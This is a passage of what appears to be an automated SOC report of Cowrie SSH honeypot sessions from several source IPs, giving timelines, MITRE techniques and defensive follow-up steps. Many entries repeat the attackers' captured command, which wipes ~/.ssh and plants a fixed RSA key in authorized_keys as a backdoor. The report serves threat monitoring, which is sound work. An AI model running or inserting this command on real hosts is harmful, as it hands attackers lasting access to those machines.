| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:00:28` | `cowrie.session.connect` |
| `2026-04-25 04:00:28` | `cowrie.client.version` |
| `2026-04-25 04:00:28` | `cowrie.client.kex` |
| `2026-04-25 04:00:29` | `cowrie.login.success` |
| `2026-04-25 04:00:29` | `cowrie.session.params` |
| `2026-04-25 04:00:29` | `cowrie.command.input` |
| `2026-04-25 04:00:29` | `cowrie.command.failed` |
| `2026-04-25 04:00:29` | `cowrie.log.closed` |
| `2026-04-25 04:00:29` | `cowrie.session.params` |
| `2026-04-25 04:00:29` | `cowrie.command.input` |
| `2026-04-25 04:00:29` | `cowrie.session.file_download` |
| `2026-04-25 04:00:29` | `cowrie.log.closed` |
| `2026-04-25 04:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1bc986cece0

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-25 04:00 |
| **Last Seen** | 2026-04-25 04:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:00:31` | `cowrie.session.connect` |
| `2026-04-25 04:00:31` | `cowrie.client.version` |
| `2026-04-25 04:00:31` | `cowrie.client.kex` |
| `2026-04-25 04:00:32` | `cowrie.login.success` |
| `2026-04-25 04:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1539f7cdb937

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:17 |
| **Last Seen** | 2026-04-25 04:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:17:16` | `cowrie.session.connect` |
| `2026-04-25 04:17:16` | `cowrie.client.version` |
| `2026-04-25 04:17:16` | `cowrie.client.kex` |
| `2026-04-25 04:17:16` | `cowrie.login.success` |
| `2026-04-25 04:17:17` | `cowrie.session.params` |
| `2026-04-25 04:17:17` | `cowrie.command.input` |
| `2026-04-25 04:17:17` | `cowrie.command.failed` |
| `2026-04-25 04:17:17` | `cowrie.log.closed` |
| `2026-04-25 04:17:17` | `cowrie.session.params` |
| `2026-04-25 04:17:17` | `cowrie.command.input` |
| `2026-04-25 04:17:17` | `cowrie.session.file_download` |
| `2026-04-25 04:17:17` | `cowrie.log.closed` |
| `2026-04-25 04:17:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04e499a69f21

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:17 |
| **Last Seen** | 2026-04-25 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:17:19` | `cowrie.session.connect` |
| `2026-04-25 04:17:19` | `cowrie.client.version` |
| `2026-04-25 04:17:20` | `cowrie.client.kex` |
| `2026-04-25 04:17:20` | `cowrie.login.success` |
| `2026-04-25 04:17:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9766846140a

| Field | Detail |
|---|---|
| **Source IP** | `111.228.58[.]144` |
| **First Seen** | 2026-04-25 04:18 |
| **Last Seen** | 2026-04-25 04:19 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:18:56` | `cowrie.session.connect` |
| `2026-04-25 04:18:56` | `cowrie.client.version` |
| `2026-04-25 04:18:57` | `cowrie.client.kex` |
| `2026-04-25 04:18:59` | `cowrie.login.success` |
| `2026-04-25 04:19:00` | `cowrie.session.params` |
| `2026-04-25 04:19:00` | `cowrie.command.input` |
| `2026-04-25 04:19:00` | `cowrie.command.failed` |
| `2026-04-25 04:19:00` | `cowrie.log.closed` |
| `2026-04-25 04:19:02` | `cowrie.session.params` |
| `2026-04-25 04:19:02` | `cowrie.command.input` |
| `2026-04-25 04:19:02` | `cowrie.session.file_download` |
| `2026-04-25 04:19:02` | `cowrie.log.closed` |
| `2026-04-25 04:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.228.58[.]144` to AbuseIPDB if not already reported
- [ ] Block `111.228.58[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d19849cb941f

| Field | Detail |
|---|---|
| **Source IP** | `111.228.58[.]144` |
| **First Seen** | 2026-04-25 04:19 |
| **Last Seen** | 2026-04-25 04:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:19:10` | `cowrie.session.connect` |
| `2026-04-25 04:19:10` | `cowrie.client.version` |
| `2026-04-25 04:19:10` | `cowrie.client.kex` |
| `2026-04-25 04:19:14` | `cowrie.login.success` |
| `2026-04-25 04:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.228.58[.]144` to AbuseIPDB if not already reported
- [ ] Block `111.228.58[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5052194bfaa

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:20 |
| **Last Seen** | 2026-04-25 04:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:20:11` | `cowrie.session.connect` |
| `2026-04-25 04:20:11` | `cowrie.client.version` |
| `2026-04-25 04:20:11` | `cowrie.client.kex` |
| `2026-04-25 04:20:11` | `cowrie.login.success` |
| `2026-04-25 04:20:12` | `cowrie.session.params` |
| `2026-04-25 04:20:12` | `cowrie.command.input` |
| `2026-04-25 04:20:12` | `cowrie.command.failed` |
| `2026-04-25 04:20:12` | `cowrie.log.closed` |
| `2026-04-25 04:20:12` | `cowrie.session.params` |
| `2026-04-25 04:20:12` | `cowrie.command.input` |
| `2026-04-25 04:20:12` | `cowrie.session.file_download` |
| `2026-04-25 04:20:12` | `cowrie.log.closed` |
| `2026-04-25 04:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fe6326b7d26

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:20 |
| **Last Seen** | 2026-04-25 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:20:14` | `cowrie.session.connect` |
| `2026-04-25 04:20:14` | `cowrie.client.version` |
| `2026-04-25 04:20:14` | `cowrie.client.kex` |
| `2026-04-25 04:20:15` | `cowrie.login.success` |
| `2026-04-25 04:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab33955d706f

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:25 |
| **Last Seen** | 2026-04-25 04:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:25:11` | `cowrie.session.connect` |
| `2026-04-25 04:25:11` | `cowrie.client.version` |
| `2026-04-25 04:25:11` | `cowrie.client.kex` |
| `2026-04-25 04:25:12` | `cowrie.login.success` |
| `2026-04-25 04:25:12` | `cowrie.session.params` |
| `2026-04-25 04:25:12` | `cowrie.command.input` |
| `2026-04-25 04:25:12` | `cowrie.command.failed` |
| `2026-04-25 04:25:12` | `cowrie.log.closed` |
| `2026-04-25 04:25:12` | `cowrie.session.params` |
| `2026-04-25 04:25:12` | `cowrie.command.input` |
| `2026-04-25 04:25:13` | `cowrie.session.file_download` |
| `2026-04-25 04:25:13` | `cowrie.log.closed` |
| `2026-04-25 04:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54e1184c18bc

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:25 |
| **Last Seen** | 2026-04-25 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:25:15` | `cowrie.session.connect` |
| `2026-04-25 04:25:15` | `cowrie.client.version` |
| `2026-04-25 04:25:15` | `cowrie.client.kex` |
| `2026-04-25 04:25:15` | `cowrie.login.success` |
| `2026-04-25 04:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60fd5ebf430d

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:27 |
| **Last Seen** | 2026-04-25 04:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:27:15` | `cowrie.session.connect` |
| `2026-04-25 04:27:15` | `cowrie.client.version` |
| `2026-04-25 04:27:15` | `cowrie.client.kex` |
| `2026-04-25 04:27:15` | `cowrie.login.success` |
| `2026-04-25 04:27:16` | `cowrie.session.params` |
| `2026-04-25 04:27:16` | `cowrie.command.input` |
| `2026-04-25 04:27:16` | `cowrie.command.failed` |
| `2026-04-25 04:27:16` | `cowrie.log.closed` |
| `2026-04-25 04:27:16` | `cowrie.session.params` |
| `2026-04-25 04:27:16` | `cowrie.command.input` |
| `2026-04-25 04:27:16` | `cowrie.session.file_download` |
| `2026-04-25 04:27:16` | `cowrie.log.closed` |
| `2026-04-25 04:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d79043836456

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:27 |
| **Last Seen** | 2026-04-25 04:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:27:18` | `cowrie.session.connect` |
| `2026-04-25 04:27:18` | `cowrie.client.version` |
| `2026-04-25 04:27:18` | `cowrie.client.kex` |
| `2026-04-25 04:27:19` | `cowrie.login.success` |
| `2026-04-25 04:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7a6907b63d1

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:28 |
| **Last Seen** | 2026-04-25 04:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:28:15` | `cowrie.session.connect` |
| `2026-04-25 04:28:15` | `cowrie.client.version` |
| `2026-04-25 04:28:15` | `cowrie.client.kex` |
| `2026-04-25 04:28:15` | `cowrie.login.success` |
| `2026-04-25 04:28:16` | `cowrie.session.params` |
| `2026-04-25 04:28:16` | `cowrie.command.input` |
| `2026-04-25 04:28:16` | `cowrie.command.failed` |
| `2026-04-25 04:28:16` | `cowrie.log.closed` |
| `2026-04-25 04:28:16` | `cowrie.session.params` |
| `2026-04-25 04:28:16` | `cowrie.command.input` |
| `2026-04-25 04:28:16` | `cowrie.session.file_download` |
| `2026-04-25 04:28:16` | `cowrie.log.closed` |
| `2026-04-25 04:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbc8c9568097

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:28 |
| **Last Seen** | 2026-04-25 04:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:28:18` | `cowrie.session.connect` |
| `2026-04-25 04:28:18` | `cowrie.client.version` |
| `2026-04-25 04:28:18` | `cowrie.client.kex` |
| `2026-04-25 04:28:19` | `cowrie.login.success` |
| `2026-04-25 04:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c470694a9a9d

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:29 |
| **Last Seen** | 2026-04-25 04:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:29:16` | `cowrie.session.connect` |
| `2026-04-25 04:29:16` | `cowrie.client.version` |
| `2026-04-25 04:29:16` | `cowrie.client.kex` |
| `2026-04-25 04:29:16` | `cowrie.login.success` |
| `2026-04-25 04:29:17` | `cowrie.session.params` |
| `2026-04-25 04:29:17` | `cowrie.command.input` |
| `2026-04-25 04:29:17` | `cowrie.command.failed` |
| `2026-04-25 04:29:17` | `cowrie.log.closed` |
| `2026-04-25 04:29:17` | `cowrie.session.params` |
| `2026-04-25 04:29:17` | `cowrie.command.input` |
| `2026-04-25 04:29:17` | `cowrie.session.file_download` |
| `2026-04-25 04:29:17` | `cowrie.log.closed` |
| `2026-04-25 04:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4002ef87256

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:29 |
| **Last Seen** | 2026-04-25 04:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:29:19` | `cowrie.session.connect` |
| `2026-04-25 04:29:19` | `cowrie.client.version` |
| `2026-04-25 04:29:20` | `cowrie.client.kex` |
| `2026-04-25 04:29:20` | `cowrie.login.success` |
| `2026-04-25 04:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f2df522384f

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:33 |
| **Last Seen** | 2026-04-25 04:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:33:22` | `cowrie.session.connect` |
| `2026-04-25 04:33:22` | `cowrie.client.version` |
| `2026-04-25 04:33:23` | `cowrie.client.kex` |
| `2026-04-25 04:33:23` | `cowrie.login.success` |
| `2026-04-25 04:33:23` | `cowrie.session.params` |
| `2026-04-25 04:33:23` | `cowrie.command.input` |
| `2026-04-25 04:33:23` | `cowrie.command.failed` |
| `2026-04-25 04:33:23` | `cowrie.log.closed` |
| `2026-04-25 04:33:24` | `cowrie.session.params` |
| `2026-04-25 04:33:24` | `cowrie.command.input` |
| `2026-04-25 04:33:24` | `cowrie.session.file_download` |
| `2026-04-25 04:33:24` | `cowrie.log.closed` |
| `2026-04-25 04:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f10c80868d1f

| Field | Detail |
|---|---|
| **Source IP** | `160.251.101[.]169` |
| **First Seen** | 2026-04-25 04:33 |
| **Last Seen** | 2026-04-25 04:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
